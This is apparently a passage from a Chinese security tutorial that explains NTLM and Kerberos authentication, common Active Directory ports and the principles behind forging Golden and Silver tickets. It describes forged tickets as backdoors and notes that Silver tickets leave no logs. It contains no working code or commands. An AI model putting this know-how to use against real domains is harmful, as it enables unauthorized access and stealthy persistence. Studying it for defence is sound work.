<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span><span class="token punctuation">.</span>Server接收到Client发送的用户名后，判断本地账户列 表是否有用户名share_user 如果没有，返回认证失败 如果有，生成Chanllenge，并且从本地查找share_user对 应的<span class="token constant">NTLM</span> Hash，使用<span class="token constant">NTLM</span> Hash加密Chanllenge，生成一 个Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash存在内存中，并将Chanllenge发送给Client。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">2</span><span class="token punctuation">.</span>Client接收到Chanllenge后，将自己提供的share_user的密码转换为<span class="token constant">NTLM</span> Hash，使用<span class="token constant">NTLM</span> Hash加密Chanllenge， 这个结果叫Response，表现形式是Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash，最后将Response发送给Server。</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">3</span><span class="token punctuation">.</span>Server接收到Client发送的Response，将Response与之 前的Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash进行比较，如果相等，则认证通过。</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token literal-property property">注意</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">.</span>Chanllenge是Server产生的一个<span class="token number">16</span>字节的随机数，每次认证都不同 <span class="token number">2</span><span class="token punctuation">.</span>Response的表现形式是Net<span class="token operator">-</span><span class="token constant">NTLM</span> Hash，它是由客户端 提供的密码Hash加密Server返回的Chanllenge产生的结果。</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126132012656.png" alt="image-20211126132012656" /></p>
<p><strong>NTLM 协议 V1 与 V2 的区别</strong></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">NTLM</span> v1与<span class="token constant">NTLM</span> v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是<span class="token constant">NTLM</span> Hash。</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">Challage</span><span class="token operator">:</span><span class="token constant">NTLM</span> v1的Challenge有<span class="token number">8</span>位，<span class="token constant">NTLM</span> v2的Challenge为<span class="token number">16</span>位。</pre></td></tr><tr><td data-num="3"></td><td><pre>Net<span class="token operator">-</span><span class="token constant">NTLM</span> <span class="token literal-property property">Hash</span><span class="token operator">:</span><span class="token constant">NTLM</span> v1的主要加密算法是<span class="token constant">DES</span>，<span class="token constant">NTLM</span> v2的主要加密算法是<span class="token constant">HMAC</span><span class="token operator">-</span><span class="token constant">MD5</span>。</pre></td></tr></table></figure><h4 id="内网渗透常用端口"><a class="anchor" href="#内网渗透常用端口">#</a> <strong>内网渗透常用端口</strong></h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">53</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">DNS</span>服务，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">53</span>端口，<span class="token constant">AD</span>域的核心就是<span class="token constant">DNS</span>服务器，<span class="token constant">AD</span>通过<span class="token constant">DNS</span>服务器定位资源</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">88</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Kerberos服务，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">88</span><span class="token function">端口，Kerberos密钥分发中心</span><span class="token punctuation">(</span><span class="token constant">KDC</span><span class="token punctuation">)</span> 在该端口上侦听Ticket请求</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">135</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">135</span>端口主要用于使用<span class="token constant">RPC</span>协议并提供<span class="token constant">DCOM</span>服务。</pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">137</span></pre></td></tr><tr><td data-num="8"></td><td><pre>NetBIOS<span class="token operator">-</span><span class="token constant">NS</span><span class="token punctuation">(</span>名称服务<span class="token punctuation">)</span>，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">137</span>端口</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">139</span></pre></td></tr><tr><td data-num="10"></td><td><pre>Session <span class="token function">Server</span><span class="token punctuation">(</span>会话服务<span class="token punctuation">)</span><span class="token punctuation">,</span>在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">139</span>端口，允许两台计算机建立连接</pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">389</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token constant">LDAP</span><span class="token function">服务</span><span class="token punctuation">(</span>轻量级目录访问协议<span class="token punctuation">)</span>，在使用中需要用到<span class="token constant">TCP</span><span class="token operator">/</span><span class="token constant">UDP</span> <span class="token number">389</span>端口，如果需要使用<span class="token constant">SSL</span>，需要使用<span class="token number">636</span>端口，</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">445</span></pre></td></tr><tr><td data-num="14"></td><td><pre>主要用于共享文件夹或共享打印，存在较多漏洞，如<span class="token constant">MS08</span><span class="token operator">-</span><span class="token number">067</span>、<span class="token constant">MS17</span><span class="token operator">-</span><span class="token number">010</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">3268</span> Global <span class="token function">Catalog</span><span class="token punctuation">(</span>全局编录服务器<span class="token punctuation">)</span>，如果需要使用<span class="token constant">SSL</span>，需要用到<span class="token number">3269</span>端口，主要用于用户登录时，负责验证用户身份的域控制器需要通过防火</pre></td></tr><tr><td data-num="16"></td><td><pre>墙，来向“全局编录”查询用户所隶属的通用组</pre></td></tr></table></figure><h4 id="ntlm身份验证"><a class="anchor" href="#ntlm身份验证">#</a> NTLM 身份验证</h4>
<p>NTLM 验证是一种 Challenge/Response 验证机制，由三种消息组成：通常称为 type 1 (协商)，类型 type 2 (质询) 和 type 3 (身份验证)。</p>
<p>它基本上是这样工作的:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126132650233.png" alt="image-20211126132650233" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1.</span> 用户登录客户端电脑</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">2.</span> <span class="token punctuation">(</span>type <span class="token number">1</span><span class="token punctuation">)</span>客户端向服务器发送type <span class="token number">1</span><span class="token punctuation">(</span>协商<span class="token punctuation">)</span>消息<span class="token punctuation">,</span>它主要包含客户端支持和服务器请求的功能列表。</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">3.</span> <span class="token punctuation">(</span>type <span class="token number">2</span><span class="token punctuation">)</span>服务器用type <span class="token number">2</span><span class="token function">消息</span><span class="token punctuation">(</span>质询<span class="token punctuation">)</span>进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的Challenge。</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">4.</span> <span class="token punctuation">(</span>type <span class="token number">3</span><span class="token punctuation">)</span>客户端用type <span class="token number">3</span><span class="token function">消息</span><span class="token punctuation">(</span>身份验证<span class="token punctuation">)</span>回复质询。用户接收到步骤<span class="token number">3</span>中的challenge之后，使用用户hash与challenge进行加密运算得到response，将response<span class="token punctuation">,</span>username<span class="token punctuation">,</span>challeng发给服务器。消息中的response是最关键的部分，因为它们向服务器证明客户端用户已经知道帐户密码。</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">5.</span> 服务器拿到type <span class="token number">3</span>之后，使用challenge和用户hash进行加密得到response2与type <span class="token number">3</span>发来的response进行比较。如果用户hash是存储在域控里面的话，那么没有用户hash，也就没办法计算response2。也就没法验证。这个时候用户服务器就会通过netlogon协议联系域控，建立一个安全通道<span class="token punctuation">,</span>然后将type <span class="token number">1</span><span class="token punctuation">,</span>type <span class="token number">2</span>，type3 <span class="token function">全部发给域控</span><span class="token punctuation">(</span>这个过程也叫作Pass Through Authentication认证流程<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">6.</span> 域控使用challenge和用户hash进行加密得到response2，与type <span class="token number">3</span>的response进行比较</pre></td></tr></table></figure><p>下面简单介绍下三个过程，如果对于细节不感兴趣的话就可以忽略。</p>
<p><strong>type 1 协商</strong></p>
<p>这个过程是客户端向服务器发送 type 1 (协商) 消息，它主要包含客户端支持和服务器请求的功能列表。</p>
<p>主要包含以下结构</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126132807866.png" alt="image-20211126132807866" /></p>
<p>抓包查看对应的信息如下</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126132832171.png" alt="image-20211126132832171" /></p>
<p><strong>type 2 质询</strong></p>
<p>这个过程是服务器用 type 2 消息 (质询) 进行响应，这包含服务器支持和同意的功能列表。但是，最重要的是，它包含服务器产生的 Challenge。</p>
<p>主要 包含以下结构</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126132903616.png" alt="image-20211126132903616" /></p>
<p><strong>type 3 身份验证</strong></p>
<p>这个过程客户端接收到 challenge 之后，使用用户 hash 与 challenge 进行加密运算得到 response，将 response,username,challenge 发给服务器。消息中的 response 是最关键的部分，因为它向服务器证明客户端用户已经知道帐户密码。</p>
<p>主要包含以下结构</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126133114164.png" alt="image-20211126133114164" /></p>
<p>这里的 Challeng 不同于 type2 的 Challenge，这里的 Challenge 是一个随机的客户端 nonce。</p>
<p>MIC 是校验和，设计 MIC 主要是为了防止这个包中途被修改</p>
<p>sessionkey 是在要求进行签名的时候用的，用来进行协商加密密钥，可能有些文章会说 sessionkey 就是加密密钥，需要拥有用户 hash 才能计算出来，因此攻击者算不出来，就无法加解密包。但是想想就不可能，这个 session_key 已经在流量里面明文传输，那攻击者拿到之后不就可以直接加解密包了。当然这是后话，后面讲签名的时候会详细讲讲这个问题。</p>
<h3 id="00x02windows之kerberos认证"><a class="anchor" href="#00x02windows之kerberos认证">#</a> 00x02.Windows 之 Kerberos 认证</h3>
<h4 id="域认证kerberos"><a class="anchor" href="#域认证kerberos">#</a> 域认证 Kerberos</h4>
<p>域内认证不再是两台机器之间互相请求认证，而是通过第三方可信机构 KDC（Key Distribute Center）来实现整个认证体系</p>
<h4 id="系统角色"><a class="anchor" href="#系统角色">#</a> 系统角色</h4>
<p>参与域认证的三个角色：</p>
<ul>
<li>Client</li>
<li>Server</li>
<li>KDC(Key Distribution Center) = AD（Account Database）+ AS（Authenication Service）+ TGS（Ticket Granting Service）</li>
</ul>
<p>从物理层面看，KDC 的角色实际为域控制器 (Domain Controller)，其中包含 AD 数据库与 AS 服务，TGS 服务。</p>
<h4 id="kerberos相关的几个概念"><a class="anchor" href="#kerberos相关的几个概念">#</a> Kerberos 相关的几个概念：</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">KDC</span><span class="token punctuation">(</span>Key Distribution Center<span class="token punctuation">)</span><span class="token operator">:</span>密钥分发中心</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">AS</span><span class="token punctuation">(</span>Authentication Server<span class="token punctuation">)</span><span class="token operator">:</span>身份认证服务</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token constant">TGT</span><span class="token punctuation">(</span>Ticket Granting Ticket<span class="token punctuation">)</span>：由<span class="token constant">AS</span>身份认证服务提供的票据也称为黄金票据，用于身份认证，存储在内存，默认有效期为<span class="token number">10</span>小时。</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">TGS</span><span class="token punctuation">(</span>Ticket Granting Server<span class="token punctuation">)</span>：由<span class="token constant">TGS</span>服务提供的票据也称为白银票据，用于发出所请求服务的票证。</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token constant">AD</span>，全称叫Account Database，被称作活动目录数据库，存放在域控<span class="token constant">NTDS</span><span class="token punctuation">.</span><span class="token constant">DIT</span>文件中，存储域中所有用户的用户名和对应的<span class="token constant">NTLM</span> Hash，<span class="token constant">KDC</span>可以从<span class="token constant">AD</span>中提取域中所有用户的<span class="token constant">NTLM</span> Hash，这是Kerberos协议能够成功实现的基础。</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token constant">AS</span>，全称叫Authenication Service，是<span class="token constant">KDC</span>的组件之一，处理初始请求并负责发出<span class="token constant">TGT</span>给Client，用来完成对Client的身份验证。</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">TGS</span>，全称叫Ticket Granting Service，也是<span class="token constant">KDC</span>的组件之一，从<span class="token constant">AS</span>那里拿到<span class="token constant">TGT</span>之后，<span class="token constant">TGS</span>再发出对某个特定服务或服务器访问的Ticket，这个Ticket允许对某个服务访问。</pre></td></tr></table></figure><h4 id="kerbreros认证流程"><a class="anchor" href="#kerbreros认证流程">#</a> Kerbreros 认证流程</h4>
<p>下图显示了 Client、Server、KDC 三者的协议交互过程。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126152356684.png" alt="image-20211126152356684" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Client向<span class="token constant">KDC</span>发起服务请求，希望获取访问Server的权限。 <span class="token constant">KDC</span>得到了这个消息，首先得判断Client是否是可信赖的， 也就是从<span class="token constant">AD</span>数据库中寻找该用户是否可用来登录。这就是<span class="token constant">AS</span>服务完成的工作，成功后，<span class="token constant">AS</span>返回<span class="token constant">TGT</span>给Client。</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>Client得到了<span class="token constant">TGT</span>后，继续向<span class="token constant">KDC</span>请求，希望获取访问Server的权限。<span class="token constant">KDC</span>又得到了这个消息，这时候通过Client 消息中的<span class="token constant">TGT</span>，判断出了Client拥有了这个权限，给了Client访问Server的权限Ticket。（<span class="token constant">TGS</span>服务的任务）</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Client得到Ticket后便可以使用这个Ticket成功访问Server。但是这个Ticket只能用来访问这个Server，如果要访问其他Server需要向<span class="token constant">KDC</span>重新申请。</pre></td></tr></table></figure><h5 id="具体过程"><a class="anchor" href="#具体过程">#</a> 具体过程</h5>
<h5 id="1-用户登陆"><a class="anchor" href="#1-用户登陆">#</a> 1、用户登陆</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126152655700.png" alt="image-20211126152655700" /></p>
<ul>
<li>用户输入 <strong>用户名</strong> 和 <strong>密码</strong> 信息</li>
<li>在客户端，用户输入的 <strong>密码</strong> 通过计算生成 NTLM 哈希作做为 <strong>CLIENT 密钥</strong></li>
</ul>
<h5 id="2-身份认证服务as认证流程"><a class="anchor" href="#2-身份认证服务as认证流程">#</a> 2、身份认证服务（AS）认证流程</h5>
<h6 id="21-客户端向as发送认证请求"><a class="anchor" href="#21-客户端向as发送认证请求">#</a> 2.1 客户端向 AS 发送认证请求</h6>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126153013290.png" alt="image-20211126153013290" /></p>
<ul>
<li>客户端向 AS 发送带有明文 <strong>用户名</strong> 的认证请求</li>
</ul>
<h6 id="22-as确认client端登录者用户身份"><a class="anchor" href="#22-as确认client端登录者用户身份">#</a> 2.2 AS 确认 Client 端登录者用户身份</h6>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126153052593.png" alt="image-20211126153052593" /></p>
<p>1、AS 从 AD 数据库中查找该用户是否存在。<br />
2、如果该 <strong>用户名</strong> 存在，则 AS 使用用户密码生成密钥，然后对响应消息<strong> Msg A</strong> 进行加密。如果找不到，则将错误消息返回给客户端。<br />
3、AS 使用 TGS 密钥对<strong> Msg B</strong> 进行加密。<br />
4、AS 将<strong> Msg A</strong> 和<strong> Msg B</strong> 返回给客户端。<br />
5、客户端使用用户的密钥解密 <strong>Msg A</strong>。请注意，客户端无法解密 <strong>Msg B</strong>。</p>
<ul>
<li>
<p>TGT（<strong>Msg B</strong>）中包含如下信息：</p>
<p>– [Client/TGS SessionKey]<br />
– Client ID<br />
– Ticket 有效时间<br />
– Client 地址</p>
</li>
</ul>
<p>6、从解密的 Msg A 中提取的 Client/TGS SessionKey（Client/TGS 会话密钥）。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>客户端无法解密Msg <span class="token constant">B</span>，即无法解密<span class="token constant">TGT</span>，解密需要<span class="token constant">TGS</span>密钥，但是密钥存在于<span class="token constant">KDC</span>上</pre></td></tr><tr><td data-num="2"></td><td><pre>需要了解：<span class="token constant">TGS</span>密钥 <span class="token operator">==</span> <span class="token constant">KDC</span> Hash <span class="token operator">==</span> krbtgt用户的<span class="token constant">NTLM</span> Hash</pre></td></tr></table></figure><p>AS 响应的消息中有一条是属于 Client 的，但另外一条却属于 TGS。<br />
认证过程中的加密除哈希外均采用的是对称加密算法。</p>
<h5 id="3-票据授予服务tgs认证流程"><a class="anchor" href="#3-票据授予服务tgs认证流程">#</a> 3、票据授予服务（TGS）认证流程</h5>
<h6 id="31-客户端向tgs发送请求服务授权请求"><a class="anchor" href="#31-客户端向tgs发送请求服务授权请求">#</a> 3.1 客户端向 TGS 发送请求服务授权请求</h6>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126153258376.png" alt="image-20211126153258376" /></p>
<p>1、客户端发送消息 Msg C，以及 Msg D</p>
<ul>
<li>
<p><strong>Msg C</strong><br />
– 要请求的服务 ID, 即 [Service ID]<br />
– 上一步 2.2 中由 AS 为 Client 提供的 TGT。</p>
</li>
<li>
<p><strong>Msg D</strong><br />
– 使用 Client/TGS SessionKey 加密的 Authenticator 1 {Client ID, Timestamp}。</p>
</li>
</ul>
<p>2、TGS 获取两个请求 <strong>Msg C</strong> 和 <strong>Msg D</strong>，先从 <strong>Msg C</strong> 中获取 TGT 以及服务 ID。</p>
<p>3、TGS 接下来使用 TGS 密钥（即 krbtgt 用户的 NTLM Hash）解密 TGT，从 TGT 中提取到 <strong>Client/TGS SessionKey</strong> ，TGS 现在有了<strong> Client/TGS SessionKey</strong>。</p>
<p>4、TGS 此时使用 <strong>Client/TGS SessionKey</strong> 解密<strong> Msg D</strong>，获得 Authenticator 1 {Client ID, Timestamp}。</p>
<p>5、TGS 比较 <strong>Msg C</strong> 以及 Msg D 获取到的 Client ID。</p>
<p>6、如果相同 TGS 生成 <strong>Msg E</strong> 以及<strong> Msg F</strong>，不同则报错误。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">TGT</span>在其生命周期内被缓存，并用于请求客户端需要的每个新服务票证。</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token constant">CLIENT</span><span class="token operator">/</span><span class="token constant">TGS</span> <span class="token constant">SESSIONKEY</span>也由客户端缓存。</pre></td></tr></table></figure><h6 id="32-tgs为client响应服务授权票据"><a class="anchor" href="#32-tgs为client响应服务授权票据">#</a> 3.2 TGS 为 Client 响应服务授权票据</h6>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126153837025.png" alt="image-20211126153837025" /></p>
<p>1、客户端接收到 TGS 发送的 <strong>Msg E</strong> 以及 Msg F</p>
<ul>
<li>
<p><strong>Msg E</strong> 使用 <strong>SERVICE 密钥</strong> (服务器的 NTLM HASH) 加密的 <strong>CLIENT-TO-SERVER TICKET</strong>，该 Ticket 中包含了如下信息:<br />
– [Client/Server SessionKey]<br />
– Client 网络地址<br />
– Ticket 有效时间<br />
– Client ID</p>
</li>
<li>
<p><strong>Msg F</strong> 使用  <code>Client/TGS SessionKey</code>  加密的  <code>Client/Server SessionKey</code></p>
</li>
</ul>
<p>2、客户端使用  <code>CLIENT/TGS SESSIONKEY</code>  解密 <code>Msg F</code>  获得  <code>CLIENT/SERVER SESSIONKEY</code></p>
<ul>
<li><strong>Msg E</strong> 使用了 <strong>[SERVICE 密钥]</strong> 加密，该消息可视作是 TGS 给 Service Server 的消息，只不过由 Client 一起携带发送给 Service Server</li>
</ul>
<h5 id="4发送服务请求"><a class="anchor" href="#4发送服务请求">#</a> 4. 发送服务请求</h5>
<h6 id="41-client向service-server发送服务请求"><a class="anchor" href="#41-client向service-server发送服务请求">#</a> 4.1 Client 向 Service Server 发送服务请求</h6>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126154223422.png" alt="image-20211126154223422" /></p>
<p>1、客户端生成 <strong>Msg E</strong> 和 <strong>Msg G</strong>（Authenticator 2）。</p>
<ul>
<li><strong>Msg E</strong> 上一步 3.2 中，TGS 为客户端响应的消息 <strong>Msg E</strong>。该消息可以理解为由客户端携带的消息。</li>
<li><strong>Msg G</strong> 由 Client/Server SessionKey 加密的 Authenticator 2，包含 {Client ID, Timestamp} 信息。</li>
</ul>
<p>2、客户端将 <strong>Msg E</strong> 和 <strong>Msg G</strong> 发送到服务器（SS）。<br />
3、服务器使用其自己的密钥对 <strong>Msg E</strong>（ticket）进行解密，得到 <strong>Client/Server SessionKey</strong><br />
4、服务器使用上一步得到的 <strong>Client/Server SessionKey</strong> 解密 <strong>Msg G</strong><br />
5、比较消息 <strong>Msg E</strong> 和 <strong>Msg G</strong> 中的 Client ID。<br />
6、如果匹配，则将<strong> Msg H</strong> 发送给客户端，以确认服务器身份和服务客户端请求的意愿（此部分是可选的）。</p>
<h6 id="42-service-server响应client"><a class="anchor" href="#42-service-server响应client">#</a> 4.2 Service Server 响应 Client</h6>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126154431559.png" alt="image-20211126154431559" /></p>
<p>1、客户端收到 Msg H。</p>
<ul>
<li>Msg H 是 Client/Server SessionKey 加密的时间戳</li>
</ul>
<p>2、客户端使用 Client/Server SessionKey 解密 Msg H。<br />
3、客户端检查 Msg H 的时间戳。<br />
4、客户端现在信任服务器，可以与服务器进行交互。</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>来自<span class="token constant">SS</span>的响应（Msg <span class="token constant">H</span>）是可选的。仅在客户端希望<span class="token constant">SS</span>对其自身进行身份验证时才需要这样做（即相互身份验证）。</pre></td></tr></table></figure><h6 id="认证流程中需要关注的点票据伪造的原理"><a class="anchor" href="#认证流程中需要关注的点票据伪造的原理">#</a> <strong>认证流程中需要关注的点，票据伪造的原理</strong></h6>
<ul>
<li>
<p>2.2 AS 确认 Client 端登录者用户身份<br />
– KDC 返回的 Msg B：使用 TGS 密钥 (KDCHASH/KRBTGT 用户 NTLMHASH) 加密的 TGT (Ticket-Granting-Ticket)，当我们获取到 krbtgt 用户的 NTLM 哈希后，便可主动使用 krbtgt 用户的 NTLM 哈希做为 TGS 密钥来生成 TGT 发送给 KDC，这样 KDC 如果通过解密伪造 TGT 获取到伪造的 [CLIENT/TGS SESSIONKEY] 可以成功解密 Authenticator 1 并完成与 TGT 中的数据进行比对，便成功骗过了 KDC，也就是成功伪造了黄金票据</p>
</li>
<li>
<p>4.1 Client 向 SSService Server 发送服务请求<br />
– 客户端向服务器发送的为使用 SERVICE 密钥 (服务器的 NTLMHASH) 加密的 CLIENT-TO-SERVER TICKET Ticket 中包含用来供服务器解密 Authenticator 2 的 CLIENT/SERVER SESSIONKEY 。如果获取到了 Service Server 的 NTLM Hash，便可伪造 Ticket，和 Authenticator 2 ，Service Server 在接收到 Ticket 和 Authenticator 2 后可以使用自己的 NTLM Hash 正常解密完成比对，也就是成功伪造了白银票据</p>
</li>
</ul>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">1</span>、黄金票据与白银票据需要拿到krbtgt或者server用户的hash，所以只能做为后门使用</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">2</span>、白银票据利用之后无日志，所以比黄金票据更好</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">3</span>、关于Service Hash，Service Hash其实是目标中一个用户名与hostname相同的用户的Hash</pre></td></tr><tr><td data-num="4"></td><td><pre>如hostname为<span class="token constant">PC</span><span class="token operator">-</span><span class="token constant">WIN7</span><span class="token literal-property property">的服务器，对应的Hash就是Username</span> <span class="token operator">:</span> <span class="token constant">PC</span><span class="token operator">-</span><span class="token constant">WIN7</span>$的哈希</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211126154653353.png" alt="image-20211126154653353" /></p>
<h5 id="黄金白银票据"><a class="anchor" href="#黄金白银票据">#</a> 黄金白银票据</h5>
<h6 id="白银票据"><a class="anchor" href="#白银票据">#</a> 白银票据</h6>
<ul>
<li>
<p>原理（伪造 Server Hash 被加密的 Ticket）</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Client 向Server 发起请求的时候，票据为Server <span class="token function">Hash</span><span class="token punctuation">(</span>Ticket<span class="token punctuation">)</span>和Server Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>而Server 除了Server Hash以外，其他都是不知道的；</pre></td></tr><tr><td data-num="2"></td><td><pre>从而，一旦知道了Server Hash后，就可以伪造Server Session Key并生成伪造的Ticket和伪造的Server Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>；</pre></td></tr><tr><td data-num="3"></td><td><pre>将伪造的Ticket使用Server Hash加密，就得到了伪造的Server <span class="token function">Hash</span><span class="token punctuation">(</span>Ticket<span class="token punctuation">)</span>；</pre></td></tr><tr><td data-num="4"></td><td><pre>最后将伪造的Server <span class="token function">Hash</span><span class="token punctuation">(</span>Ticket<span class="token punctuation">)</span>和Server Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>发送给Srever 即可以验证通过。</pre></td></tr></table></figure></li>
<li>
<p>特点</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>需要目标服务的<span class="token constant">NTML</span> Hash，即Server Hash；</pre></td></tr><tr><td data-num="2"></td><td><pre>不需要与<span class="token constant">KDC</span> 交互；</pre></td></tr><tr><td data-num="3"></td><td><pre>只能访问指定服务器；</pre></td></tr></table></figure></li>
</ul>
<h6 id="黄金票据"><a class="anchor" href="#黄金票据">#</a> 黄金票据</h6>
<ul>
<li>
<p>原理（伪造被 krbtgt Hash 加密的 TGT）</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>在Client向<span class="token constant">AS</span> 发送验证信息的时候，验证消息为：</pre></td></tr><tr><td data-num="2"></td><td><pre>Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Client Info<span class="token operator">+</span>Server Info</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>而<span class="token constant">AS</span> 又是使用<span class="token constant">KDC</span> Hash（krbtgt Hash）解密<span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span>得到<span class="token constant">TGT</span>，并从<span class="token constant">TGT</span>中获得session Key；</pre></td></tr><tr><td data-num="6"></td><td><pre>最后再利用Session Key去解密Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span>获得Client Info<span class="token operator">+</span>Server Info，去对比未加密的Client Info<span class="token operator">+</span>Server Info是否一致从而验证客户端身份；</pre></td></tr><tr><td data-num="7"></td><td><pre>所以，如果知道了<span class="token constant">KDC</span> Hash（krbtgt Hash）就可以伪造session Key，从而伪造<span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span>，进而发送伪造的：</pre></td></tr><tr><td data-num="8"></td><td><pre>Session <span class="token function">Key</span><span class="token punctuation">(</span>Client Info<span class="token operator">+</span>Timestamp<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>Client Info<span class="token operator">+</span>Server Info</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token constant">KDC</span> <span class="token function">Hash</span><span class="token punctuation">(</span><span class="token constant">TGT</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>最终达到身份验证的目的；</pre></td></tr></table></figure></li>
<li>
<p>特点</p>
